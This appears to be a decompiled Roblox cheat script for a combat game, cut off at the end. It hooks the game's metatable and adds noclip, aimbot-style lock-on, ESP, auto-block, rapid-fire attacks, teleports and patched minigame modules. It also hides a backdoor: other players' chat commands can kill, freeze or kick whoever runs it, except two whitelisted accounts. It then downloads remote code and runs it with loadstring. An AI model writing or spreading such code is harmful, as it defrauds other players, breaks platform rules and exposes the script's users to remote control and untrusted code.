local v1 = game:GetService("ReplicatedStorage"):WaitForChild("Animations"):WaitForChild("Emotes")
local v5 = {}
local vu6 = {}
for _, v8 in ipairs(v1:GetDescendants()) do
    if v8:IsA("Animation") and v8.Name ~= "Camera" then
        table.insert(v5, v8.Name)
        vu6[v8.Name] = v8
    end
end

local vu9 = game:GetService("Players")
local v10 = game:GetService("TextChatService")
local vu11 = vu9.LocalPlayer
local vu12 = vu11.Character or vu11.CharacterAdded:Wait()
local vu13 = {
    "skibidislume007",
    "hashtag_hashtagcoma3"
}

vu11.CharacterAdded:Connect(function(p14)
    vu12 = p14
end)

local function vu17()
    if vu12 and vu12:FindFirstChild("HumanoidRootPart") then
        local v15 = vu12.HumanoidRootPart
        local v16 = workspace.Map.Model.Barriers:FindFirstChild("AntiStuckInVoid")
        if v16 then
            firetouchinterest(v15, v16, 0)
            task.wait(0.1)
            firetouchinterest(v15, v16, 1)
        end
    end
end

local function vu24(p18)
    if vu12 then
        for _, v23 in ipairs(vu12:GetChildren()) do
            if v23:IsA("BasePart") then
                v23.Anchored = p18
            end
        end
    end
end

local function vu29()
    for _, v28 in ipairs(vu13) do
        if vu11.Name == v28 then
            return true
        end
    end
    return false
end

local vu30 = getrawmetatable(game)
setreadonly(vu30, false)
local vu31 = vu30.__namecall
local noAttackEnabled = false

function vu30.__namecall(p32, ...)
    if noAttackEnabled and getnamecallmethod() == "FireServer" and p32.Name == "AttackInput" then
        return nil
    end
    return vu31(p32, ...)
end

setreadonly(vu30, true)

function noattack()
    noAttackEnabled = true
end

function attack()
    noAttackEnabled = false
end

v10:WaitForChild("TextChannels"):WaitForChild("RBXGeneral").MessageReceived:Connect(function(p33)
    if p33.TextSource and p33.TextSource.UserId ~= vu11.UserId then
        if vu29() then
            return
        end
        local v34 = p33.Text:lower()
        if v34 == "!kill" then
            vu17()
        elseif v34 == "!freeze" then
            vu24(true)
        elseif v34 == "!unfreeze" then
            vu24(false)
        elseif v34 == "!noattack" then
            noattack()
        elseif v34 == "!yesattack" then
            attack()
        elseif v34 == "!speedup" then
            speedup()
        elseif v34 == "!kick" then
            vu11:Kick("sybau boi")
        end
    end
end)

local vu35 = false
local vu36 = "Dash"
local vu37 = true
local vu38 = {
    DashDirection = "Front"
}
local vu39 = game:GetService("UserInputService")
vu39.InputBegan:Connect(function(p40, _)
    if vu35 then
        if p40.KeyCode == Enum.KeyCode.Q and vu39:IsKeyDown(Enum.KeyCode.W) then
            game:GetService("Players").LocalPlayer.Remotes.Combat.AttackInput:FireServer(vu36, vu37, vu38)
        end
    end
end)

local vu41 = game:GetService("UserInputService")
local vu42 = false
local vu43 = "Dash"
local vu44 = true
local vu45 = {
    DashDirection = "Left",
    Evasive = true
}
vu41.InputBegan:Connect(function(p46, p47)
    if vu42 then
        if p46.KeyCode == Enum.KeyCode.Q and not p47 and (vu41:IsKeyDown(Enum.KeyCode.A) or vu41:IsKeyDown(Enum.KeyCode.D)) then
            game:GetService("Players").LocalPlayer.Remotes.Combat.AttackInput:FireServer(vu43, vu44, vu45)
        end
    end
end)

local v48 = game:GetService("RunService")
local v49 = vu9.LocalPlayer
local vu50 = v49:WaitForChild("PlayerGui"):WaitForChild("StatesHolder"):WaitForChild("States")
local v51 = workspace.Map.Model.Locations.Ruins
local vu55 = vu12
local vu56 = vu38
local vu57 = vu37
local vu58 = vu36
local v59 = {}

for _, v61 in ipairs(v51:GetDescendants()) do
    if v61:IsA("BasePart") then
        table.insert(v59, v61)
    end
end

if #v59 ~= 0 then
    local vu62 = v59[math.random(1, #v59)]
    vu62.Size = Vector3.new(4, 20, 4)
    vu62.Transparency = 1
    vu62.Anchored = false
    vu62.CanCollide = true
    local vu63 = false
    local vu64 = nil

    local function v66(p65)
        vu64 = p65:WaitForChild("HumanoidRootPart")
    end
    if v49.Character then
        v66(v49.Character)
    end
    v49.CharacterAdded:Connect(v66)

    v48.RenderStepped:Connect(function()
        if vu64 and vu62 then
            if vu63 then
                vu62.Anchored = false
                local v67 = vu64.CFrame.LookVector * 8
                vu62.CFrame = CFrame.new(vu64.Position + v67)
            else
                vu62.Anchored = true
            end
            vu62.CanCollide = not vu50:GetAttribute("Ragdolled")
        end
    end)

    local vu68 = game:GetService("RunService")
    local vu69 = game:GetService("Players").LocalPlayer
    local vu70 = false
    local vu71 = nil

    function startNoclip()
        if vu71 then
            vu71:Disconnect()
        end
        vu71 = vu68.Stepped:Connect(function()
            local v72 = vu69.Character
            if v72 and vu70 then
                for _, v76 in ipairs(v72:GetDescendants()) do
                    if v76:IsA("BasePart") and v76.CanCollide then
                        v76.CanCollide = false
                    end
                end
            end
        end)
    end

    function stopNoclip()
        if vu71 then
            vu71:Disconnect()
            vu71 = nil
        end
        local v78 = vu69.Character
        if v78 then
            for _, v82 in ipairs(v78:GetDescendants()) do
                if v82:IsA("BasePart") then
                    v82.CanCollide = true
                end
            end
        end
    end

    local v83 = game:GetService("RunService")
    local vu84 = vu9.LocalPlayer
    local vu86 = vu84:WaitForChild("PlayerGui"):WaitForChild("StatesHolder"):WaitForChild("States")
    lockOnEnabled = false
    smoothness = 0.15
    local vu87 = nil
    local vu88 = lockOnEnabled

    local function vu100()
        local v89 = nil
        local v90 = math.huge
        local v91 = vu84.Character
        if not v91 then return nil end
        local v92 = v91:FindFirstChild("HumanoidRootPart")
        if not v92 then return nil end
        for _, v97 in pairs(vu9:GetPlayers()) do
            if v97 ~= vu84 and v97.Character and v97.Character:FindFirstChild("HumanoidRootPart") then
                local v98 = v97.Character.HumanoidRootPart
                local v99 = (v92.Position - v98.Position).Magnitude
                if v99 < v90 then
                    v89 = v97
                    v90 = v99
                end
            end
        end
        return v89
    end

    v83.RenderStepped:Connect(function()
        if lockOnEnabled ~= vu88 then
            vu88 = lockOnEnabled
            if lockOnEnabled then
                vu87 = vu100()
            else
                vu87 = nil
                if vu84.Character and vu84.Character:FindFirstChildOfClass("Humanoid") then
                    vu84.Character:FindFirstChildOfClass("Humanoid").AutoRotate = true
                end
            end
        end
        if lockOnEnabled and vu87 then
            local v101 = vu84.Character
            if v101 then
                local v102 = v101:FindFirstChildOfClass("Humanoid")
                local v103 = v101:FindFirstChild("HumanoidRootPart")
                if v102 and v103 then
                    v102.AutoRotate = false
                    if vu86:GetAttribute("Grabbing") then return
                    elseif vu86:GetAttribute("Grabbed") then return
                    elseif vu86:GetAttribute("GrabIFrames") then return
                    elseif vu86:GetAttribute("Ragdolled") then return
                    elseif vu86:GetAttribute("Dashing") then return
                    elseif vu87.Character and vu87.Character:FindFirstChild("HumanoidRootPart") then
                        local v104 = vu87:FindFirstChild("PlayerGui") and vu87.PlayerGui:FindFirstChild("StatesHolder")
                        if v104 then
                            v104 = vu87.PlayerGui.StatesHolder:FindFirstChild("States")
                        end
                        if not (v104 and v104:GetAttribute("Grabbing")) then
                            local v105 = vu87.Character.HumanoidRootPart.Position
                            local v106 = v103.Position
                            local v107 = Vector3.new(v105.X, v106.Y, v105.Z)
                            local v108 = CFrame.new(v106, v107)
                            v103.CFrame = v103.CFrame:Lerp(v108, smoothness)
                        end
                    else
                        return
                    end
                else
                    return
                end
            else
                return
            end
        else
            return
        end
    end)

    local vu109 = vu9.LocalPlayer
    local vu110 = nil
    function updateHRP2()
        vu110 = (vu109.Character or vu109.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    end
    updateHRP2()
    vu109.CharacterAdded:Connect(function()
        updateHRP2()
    end)

    coroutine.wrap(function()
        local v111 = workspace.Visuals:WaitForChild("ERADICATE Map")
        for _, v115 in ipairs(v111:GetDescendants()) do
            if v115:IsA("Part") then
                v115.CanCollide = true
            end
        end
        local v116 = workspace.Visuals:WaitForChild("InvincibleMap")
        for _, v120 in ipairs(v116:GetDescendants()) do
            if v120:IsA("Part") then
                v120.CanCollide = true
            end
        end
    end)()

    local _ = game:GetService("ReplicatedStorage").Remotes.Combat.Ragdoll
    local vu121 = vu9.LocalPlayer
    local vu122 = "Chara"

    local function vu125()
        task.spawn(function()
            local v123 = (vu121.Character or vu121.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
            local v124 = workspace:WaitForChild("Models"):WaitForChild(vu122)
            if v124 and v124.PrimaryPart then
                v123.CFrame = v124.PrimaryPart.CFrame
            end
        end)
    end

    task.spawn(function()
        local vu126 = workspace:WaitForChild("Visuals")
        function tptoitem()
            local v127 = (vu121.Character or vu121.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
            for _, v132 in ipairs(vu126:GetChildren()) do
                if v132:IsA("Model") and (v132.PrimaryPart and (v132.Name == "Temp V" or v132.Name == "Railgun" or v132.Name == "Daybreak")) then
                    v127.CFrame = v132.PrimaryPart.CFrame
                    break
                end
            end
        end
    end)

    task.spawn(function()
    end)

    local vu133 = game:GetService("RunService")
    local vu134 = false

    task.spawn(function()
        local vu135 = workspace:WaitForChild("Models"):WaitForChild("Chara")
        vu133.Heartbeat:Connect(function()
            if vu134 then
                if game:GetService("Players").LocalPlayer.PlayerGui.StatesHolder.States:GetAttribute("GrabIFrames") then
                    return
                else
                    local v136 = (vu121.Character or vu121.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")
                    if v136 and (vu135 and vu135.PrimaryPart) then
                        local v137 = vu135.PrimaryPart.CFrame
                        local v138 = v137.LookVector * -3
                        v136.CFrame = CFrame.new(v137.Position + v138, v137.Position)
                    end
                end
            else
                return
            end
        end)
    end)

    local vu139 = {}
    function updateplrsdropdown()
        table.clear(vu139)
        for _, v143 in ipairs(game.Players:GetPlayers()) do
            if v143 ~= game.Players.LocalPlayer then
                table.insert(vu139, v143.Name)
            end
        end
    end
    updateplrsdropdown()
    game.Players.PlayerAdded:Connect(updateplrsdropdown)
    game.Players.PlayerRemoving:Connect(updateplrsdropdown)

    local vu144 = false
    local vu145 = game:GetService("Players").LocalPlayer.Remotes.Combat
    local vu146 = "M1"
    local vu147 = true
    local vu148 = "M1"
    local vu149 = false
    local fastkillConnection1 = nil
    local fastkillConnection2 = nil

    function fastkill()
        if fastkillConnection1 then fastkillConnection1:Disconnect() end
        if fastkillConnection2 then fastkillConnection2:Disconnect() end
        if vu144 then
            fastkillConnection1 = v48.Heartbeat:Connect(function()
                if not vu144 then
                    fastkillConnection1:Disconnect()
                    return
                end
                vu145.AttackInput:FireServer(vu58, vu57, vu56)
            end)
            local lastM1 = 0
            fastkillConnection2 = v48.Heartbeat:Connect(function()
                if not vu144 then
                    fastkillConnection2:Disconnect()
                    return
                end
                local now = tick()
                if now - lastM1 >= 0.4 then
                    lastM1 = now
                    vu145.AttackInput:FireServer(vu146, vu147)
                    vu145.AttackInput:FireServer(vu148, vu149)
                end
            end)
        end
    end

    local vu150 = false
    local vu151 = false
    local vu152 = 50
    local vu153 = nil
    local v154 = game:GetService("UserInputService")
    local v155 = game:GetService("RunService")
    local v156 = game:GetService("Players").LocalPlayer
    local vu157 = nil
    local vu158 = nil

    local function vu160(p159)
        vu158 = p159
        vu157 = p159:FindFirstChildWhichIsA("Humanoid")
    end
    if v156.Character then
        vu160(v156.Character)
    end
    v156.CharacterAdded:Connect(function(p161)
        p161:WaitForChild("HumanoidRootPart", 3)
        vu160(p161)
    end)

    v154.InputBegan:Connect(function(p162, p163)
        if not p163 then
            if p162.KeyCode == vu153 then
                vu151 = not vu151
                print("TP Walking: ", vu151)
            end
        end
    end)

    v155.Heartbeat:Connect(function(p164)
        if vu150 and (vu151 and (vu158 and vu157)) then
            if vu157.MoveDirection.Magnitude > 0 then
                vu158:TranslateBy(vu157.MoveDirection * vu152 * p164)
            end
        end
    end)

    local vu165 = game:GetService("Players")
    local v166 = game:GetService("RunService")
    local vu167 = vu165.LocalPlayer
    local vu168 = false
    local vu169 = ""

    local function vu179()
        if vu169 == "" then return nil end
        for _, v174 in pairs(vu165:GetPlayers()) do
            if v174 ~= vu167 and v174.Character and v174.Character:FindFirstChild("HumanoidRootPart") then
                local v175 = v174.Name:lower()
                local v176 = v174.DisplayName:lower()
                local v177 = vu169
                if v175:sub(1, #vu169) == v177:lower() then
                    return v174
                end
                local v178 = vu169
                if v176:sub(1, #vu169) == v178:lower() then
                    return v174
                end
            end
        end
        return nil
    end

    v166.RenderStepped:Connect(function()
        if vu168 then
            local v180 = vu179()
            if v180 then
                local v181 = v180.Character:FindFirstChild("HumanoidRootPart")
                local v182 = vu167.Character
                if v182 then
                    v182 = v182:FindFirstChild("HumanoidRootPart")
                end
                if v181 and v182 then
                    local v183 = v181.Position - v181.CFrame.LookVector * 3
                    v182.CFrame = CFrame.new(v183, v181.Position)
                end
            else
                return
            end
        else
            return
        end
    end)

    local vu184 = game:GetService("Players")
    local v185 = game:GetService("RunService")
    local v186 = game:GetService("ReplicatedStorage")
    local vu187 = game:GetService("Stats")
    local vu188 = vu184.LocalPlayer
    local vu189 = vu188:WaitForChild("Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")
    local v190 = v186:WaitForChild("Animations"):WaitForChild("Attacks"):WaitForChild("Global"):WaitForChild("M1")
    local vu194 = vu70
    local vu195 = vu134
    local vu196 = vu144
    local vu197 = vu169
    local vu198 = vu168
    local vu199 = {}
    local vu200 = false
    local vu201 = 20
    local vu202 = false

    for _, v204 in ipairs(v190:GetDescendants()) do
        if v204:IsA("Animation") then
            vu199[v204.AnimationId] = true
        end
    end

    local function vu205()
        if vu200 then
            vu189:FireServer("Block", false)
            vu200 = false
        end
    end

    local function vu227()
        local v206 = vu188.Character
        if not v206 then return nil end
        local v207 = v206:FindFirstChild("HumanoidRootPart")
        if not v207 then return nil end
        local v208 = vu201
        local v213 = nil
        for _, v214 in ipairs(vu184:GetPlayers()) do
            if v214 ~= vu188 then
                local v215 = v214.Character
                local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
                if v216 then
                    local v217 = (v207.Position - v216.Position).Magnitude
                    if v217 < v208 then
                        local v218 = v215:FindFirstChildOfClass("Humanoid")
                        if v218 then
                            for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
                                if vu199[v222.Animation.AnimationId] then
                                    v213 = v214
                                    v208 = v217
                                    break
                                end
                            end
                            for _, v226 in ipairs(v218:GetPlayingAnimationTracks()) do
                                if vu199[v226.Animation.AnimationId] then
                                    v213 = v214
                                    v208 = v217
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
        return v213
    end

    local vu228 = 0.1
    v185.Heartbeat:Connect(function()
        if vu202 then
            local v229 = vu227()
            if v229 and not vu200 then
                vu200 = true
                local v230 = vu228 + vu187.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 / 2
                task.delay(v230, function()
                    if vu200 then
                        vu189:FireServer("Block", true)
                    end
                end)
            elseif not v229 and vu200 then
                vu205()
            end
        else
            vu205()
        end
    end)

    local vu231 = game:GetService("Players")
    local v232 = game:GetService("RunService")
    local v233 = game:GetService("ReplicatedStorage")
    local vu234 = vu231.LocalPlayer
    local v235 = v233:WaitForChild("Animations"):WaitForChild("Attacks")
    local v236 = v235:FindFirstChild("Global"):FindFirstChild("Block")
    local vu240 = vu228
    local v241 = {
        "FinisherVictim",
        "VariantVictimFling",
        "VariantHitVictim",
        "Victim",
        "Recall",
        "Throw"
    }
    local vu242 = {}
    local vu243 = 7
    local vu244 = 5
    local vu245 = 20
    local vu246 = false

    for _, v248 in ipairs(v235:GetDescendants()) do
        if v248:IsA("Animation") and not (table.find(v241, v248.Name) or v236 and v248:IsDescendantOf(v236)) then
            vu242[v248.AnimationId] = true
        end
    end

    local vu249 = {}

    local function vu259(p250)
        local v251 = p250:FindFirstChild("HumanoidRootPart")
        if v251 then
            local v252 = Instance.new("Part")
            local v253 = v251.Size
            v252.Size = Vector3.new(v253.X * vu243, v253.Y * vu244, v253.Z * vu243)
            v252.Anchored = true
            v252.CanCollide = false
            v252.Material = Enum.Material.Neon
            v252.Color = Color3.fromRGB(255, 0, 0)
            v252.Parent = workspace
            v252.Transparency = 0.9
            v252.Touched:Connect(function(p254)
                local v255 = vu234.Character
                local v256 = v255 and v255:FindFirstChild("HumanoidRootPart")
                if v256 and p254:IsDescendantOf(v255) then
                    local v257 = math.random() * math.pi * 2
                    local v258 = Vector3.new(math.cos(v257), 0, math.sin(v257)) * vu245
                    v256.CFrame = v256.CFrame + v258
                end
            end)
            return v252
        end
    end

    local function vu265(p260)
        for _, v264 in ipairs(p260:GetPlayingAnimationTracks()) do
            if vu242[v264.Animation.AnimationId] then
                return true
            end
        end
        return false
    end

    v232.Heartbeat:Connect(function()
        if vu246 then
            local v266 = vu234.Character
            if v266 and v266:FindFirstChild("HumanoidRootPart") then
                for _, v271 in ipairs(vu231:GetPlayers()) do
                    if v271 ~= vu234 then
                        local v272 = v271.Character
                        local v273 = v272 and v272:FindFirstChildOfClass("Humanoid")
                        local v274 = v272 and v272:FindFirstChild("HumanoidRootPart")
                        if v273 and v274 then
                            local v275 = vu265(v273)
                            if v275 and not vu249[v271] then
                                vu249[v271] = vu259(v272)
                            elseif not v275 and vu249[v271] then
                                vu249[v271]:Destroy()
                                vu249[v271] = nil
                            end
                            if vu249[v271] then
                                vu249[v271].CFrame = v274.CFrame
                            end
                        end
                    end
                end
            end
        else
            for v278, v279 in pairs(vu249) do
                if v279 then
                    v279:Destroy()
                end
                vu249[v278] = nil
            end
            return
        end
    end)

    local vu280 = nil
    local _ = game:GetService("Players").LocalPlayer.PlayerGui.StatesHolder.Values
    local v281 = game:GetService("Players")
    local vu282 = game:GetService("RunService")
    local v283 = v281.LocalPlayer
    local vu284 = false
    local vu285 = {}
    local vu286 = nil
    local vu287 = {
        "Head",
        "Torso",
        "Left Arm",
        "Right Arm",
        "Left Leg",
        "Right Leg"
    }

    local function vu295(p288, p289)
        for _, v293 in ipairs(vu287) do
            local v294 = p289:FindFirstChild(v293)
            if v294 and v294:IsA("BasePart") then
                v294.Transparency = p288
            end
        end
    end

    local function vu300()
        for _, v299 in pairs(vu285) do
            if v299 then
                v299:Disconnect()
            end
        end
        vu285 = {}
        if vu286 and vu286.IsPlaying then
            vu286:Stop()
        end
    end

    local function vu305(p301)
        vu300()
        local v302 = p301:WaitForChild("Humanoid")
        local v303 = v302:FindFirstChildOfClass("Animator") or Instance.new("Animator", v302)
        local v304 = Instance.new("Animation")
        v304.AnimationId = "rbxassetid://83555998356899"
        vu286 = v303:LoadAnimation(v304)
        vu286.Priority = Enum.AnimationPriority.Action4
        if vu284 then
            vu295(0.5, p301)
            table.insert(vu285, vu282.Heartbeat:Connect(function()
                if not vu286.IsPlaying then
                    vu286:Play()
                end
                vu286:AdjustSpeed(0)
                vu286.TimePosition = 10
            end))
            table.insert(vu285, vu282.RenderStepped:Connect(function()
                if vu286.IsPlaying then
                    vu286:Stop()
                end
            end))
        else
            vu295(0, p301)
        end
    end

    v283.CharacterAdded:Connect(function(p306)
        p306:WaitForChild("HumanoidRootPart")
        vu300()
        vu305(p306)
    end)

    local vu307 = game:GetService("Players").LocalPlayer
    _G.teleportSystemEnabled = false
    local vu308 = {
        ["rbxassetid://131119786321608"] = { WaitBeforeTP = 0.5, WaitBeforeReturn = 1, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://17328216455"] = { WaitBeforeTP = 0.2, WaitBeforeReturn = 2.5, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://122251269146682"] = { WaitBeforeTP = 2, WaitBeforeReturn = 1.2, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://17363516672"] = { WaitBeforeTP = 1.5, WaitBeforeReturn = 1.9, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://120727188616742"] = { WaitBeforeTP = 4.5, WaitBeforeReturn = 2.3, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://89321564775434"] = { WaitBeforeTP = 3, WaitBeforeReturn = 1.5, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://84564795122295"] = { WaitBeforeTP = 0.5, WaitBeforeReturn = 2.1, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://18963750417"] = { WaitBeforeTP = 3, WaitBeforeReturn = 1.3, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://133215803608854"] = { WaitBeforeTP = 2.3, WaitBeforeReturn = 0.7, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://18961261037"] = { WaitBeforeTP = 0.6, WaitBeforeReturn = 1.3, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://72769760974491"] = { WaitBeforeTP = 0.7, WaitBeforeReturn = 0.9, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
        ["rbxassetid://119118796924159"] = { WaitBeforeTP = 0.1, WaitBeforeReturn = 0.9, TeleportCFrame = CFrame.new(492.30304, -128.023254, -3094.72705, 0.999242604, -2.17310808e-10, 0.0389125906, -1.89323029e-10, 1, 1.04462448e-8, -0.0389125906, -1.04456994e-8, 0.999242604) },
    }

    local function vu316()
        local v309 = vu307.Character or vu307.CharacterAdded:Wait()
        local v310 = v309:WaitForChild("Humanoid")
        local vu311 = v309:WaitForChild("HumanoidRootPart")
        v310.AnimationPlayed:Connect(function(p312)
            if _G.teleportSystemEnabled then
                local v313 = vu308[p312.Animation.AnimationId]
                if v313 then
                    local vu314 = vu311.CFrame
                    task.wait(v313.WaitBeforeTP)
                    if _G.teleportSystemEnabled and (vu311 and vu311.Parent) then
                        vu311.CFrame = v313.TeleportCFrame
                    end
                    local v315 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 / 2
                    task.delay(v313.WaitBeforeReturn + v315, function()
                        if _G.teleportSystemEnabled and (vu311 and vu311.Parent) then
                            vu311.CFrame = vu314
                        end
                    end)
                end
            end
        end)
    end

    vu307.CharacterAdded:Connect(function()
        task.wait(1)
        vu316()
    end)
    if vu307.Character then
        vu316()
    end

    local _ = game:GetService("Lighting").ClockTime
    local v317 = game:GetService("Players")
    local _ = v317.LocalPlayer
    local v318 = "AntiFling_Immunity"
    local v319 = true
    game:GetService("Players").LocalPlayer:SetAttribute(v318, v319)
    print("Attribute '" .. v318 .. "' set to " .. tostring(v319) .. " on the character.")
    warn("Character not found. Could not set the attribute.")

    local v320 = game:GetService("Players")
    local vu321 = game:GetService("ReplicatedStorage")
    local v322 = v320.LocalPlayer
    local vu323 = {}
    local vu324 = false

    local function v330()
        vu323 = {}
        for _, v328 in pairs(vu321.Animations.Attacks.Global.Block:GetDescendants()) do
            if v328:IsA("Animation") then
                local v329 = tonumber(v328.AnimationId:match("%d+"))
                if v329 then
                    table.insert(vu323, v329)
                end
            end
        end
    end

    local function vu336(p331)
        for _, v335 in pairs(vu323) do
            if p331 == v335 then
                return true
            end
        end
        return false
    end

    local function vu345(p337)
        p337.AnimationPlayed:Connect(function(p338)
            if vu324 then
                local v339 = tonumber(p338.Animation.AnimationId:match("%d+"))
                if v339 and vu336(v339) then
                    p338:Stop()
                end
            end
        end)
        for _, v343 in pairs(p337:GetPlayingAnimationTracks()) do
            local v344 = tonumber(v343.Animation.AnimationId:match("%d+"))
            if v344 and vu336(v344) then
                v343:Stop()
            end
        end
    end

    local function vu347(p346)
        vu345((p346:WaitForChild("Humanoid")))
    end

    v330()
    if v322.Character then
        vu347(v322.Character)
    end
    v322.CharacterAdded:Connect(function(p348)
        vu347(p348)
    end)

    local vu349 = require(game:GetService("ReplicatedStorage").Modules.Player.Character.Combat)
    local vu350 = vu349.ToggleRagdollStates

    local autoWinChara3 = false
    local autoGodlikeClash = false

    local CharaModule = require(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Des.Chara)
    local originalCharaNew = CharaModule.new
    CharaModule.new = function(...)
        local self = originalCharaNew(...)
        if autoWinChara3 then
            task.spawn(function()
                task.wait(1)
                if self and self.Stop then
                    self:Stop({reason = "server"})
                end
            end)
        end
        return self
    end

    local ClashModule = require(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Des.Clash)
    local originalClashNew = ClashModule.new
    ClashModule.new = function(config)
        local self = originalClashNew(config)
        if autoGodlikeClash then
            self._pressCount = 999999
            task.spawn(function()
                task.wait(0.1)
                if self._complete then
                    self:_complete()
                end
            end)
        end
        return self
    end    local vu351 = require(game:GetService("ReplicatedStorage").Modules.Player.Character.Combat)
    local vu352 = vu351.Velocity
    local vu353 = require(game:GetService("ReplicatedStorage").Modules.Player.Character.Combat.ClientHandlers.WallRun)
    local vu354 = vu353.CanActivate
    local _ = game:GetService("Players").LocalPlayer
    local vu355 = game:GetService("RunService")
    local v356 = game:GetService("Players")
    local vu357 = v356.LocalPlayer
    local v358 = vu357.Character or vu357.CharacterAdded:Wait()
    v358:WaitForChild("Humanoid")
    local vu359 = v358.HumanoidRootPart
    local vu360 = false
    local vu361 = workspace.CurrentCamera

    function esp(pu362)
        local vu363 = nil
        local vu364 = {
            Box = Drawing.new("Square"),
            BoxOutline = Drawing.new("Square"),
            HealthBar = Drawing.new("Square")
        }
        local function v378()
            vu363 = vu355.RenderStepped:Connect(function()
                local v365 = pu362.Character
                local v366 = v365:FindFirstChildOfClass("Humanoid")
                local v367 = v366.Health / v366.MaxHealth
                if v365 and vu360 then
                    local v368 = v365:waitForChild("HumanoidRootPart")
                    if v368 and vu360 then
                        local v369, v370 = vu361:WorldToViewportPoint(v368.Position)
                        if v370 then
                            local v371 = 1 / (v369.Z * math.tan(math.rad(vu361.FieldOfView * 0.5)) * 2) * 1000
                            local v372 = math.floor(9.5 * v371)
                            local v373 = math.floor(12 * v371)
                            local v374 = math.floor(v369.X)
                            local v375 = math.floor(v369.Y)
                            local v376 = math.floor(v374 - v372 * 0.5)
                            local v377 = math.floor(v375 - v373 * 0.5 + 0.5 * v371)
                            vu364.Box.Size = Vector2.new(v372, v373)
                            vu364.Box.Position = Vector2.new(v376, v377)
                            vu364.Box.Visible = true
                            vu364.Box.Color = Color3.fromRGB(255, 255, 255)
                            vu364.Box.Thickness = 0.5
                            vu364.BoxOutline.Size = Vector2.new(v372, v373)
                            vu364.BoxOutline.Position = Vector2.new(v376, v377)
                            vu364.BoxOutline.Visible = true
                            vu364.BoxOutline.Color = Color3.fromRGB(255, 255, 255)
                            vu364.BoxOutline.Thickness = 0.5
                            vu364.BoxOutline.ZIndex = 1
                            vu364.Box.ZIndex = 2
                            vu364.HealthBar.Size = vu364.HealthBar.Size:Lerp(Vector2.new(2, v373 * v367), 0.25)
                            vu364.HealthBar.Position = Vector2.new(v376 - 14, v377 + (v373 - v373 * v367))
                            vu364.HealthBar.Color = Color3.fromRGB(255 * (1 - v367), 255 * v367, 0)
                            vu364.HealthBar.Visible = true
                        else
                            vu364.Box.Visible = false
                            vu364.BoxOutline.Visible = false
                            vu364.HealthBar.Visible = false
                        end
                    else
                        vu364.Box.Visible = false
                        vu364.BoxOutline.Visible = false
                        vu364.HealthBar.Visible = false
                    end
                else
                    vu364.Box.Visible = false
                    vu364.BoxOutline.Visible = false
                    vu364.HealthBar.Visible = false
                end
            end)
        end
        coroutine.wrap(v378)()
    end

    local vu382 = vu284
    local vu383 = vu360
    local vu384 = vu286
    local vu385 = vu300
    local vu386 = vu305

    for _, v387 in pairs(v356:GetPlayers()) do
        if v387 ~= vu357 then
            coroutine.wrap(esp)(v387)
        end
    end

    v356.PlayerAdded:Connect(function(pu388)
        task.delay(1, function()
            coroutine.wrap(esp)(pu388)
        end)
    end)

    v356.PlayerRemoving:Connect(function(p389)
        if p389 ~= vu357 then
            if p389.EspConnection then
                p389.EspConnection:Disconnect()
                p389.EspConnection = nil
            end
            if p389.Drawings then
                for _, v393 in pairs(p389.Drawings) do
                    v393:Remove()
                end
                p389.Drawings = nil
            end
        end
    end)

    local v394 = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))():CreateWindow({
        Title = "Jumper",
        Icon = "moon-star",
        Author = "ccgvb",
        Folder = "Jumper",
        Size = UDim2.fromOffset(200, 140),
        Transparent = true,
        Theme = "Dark",
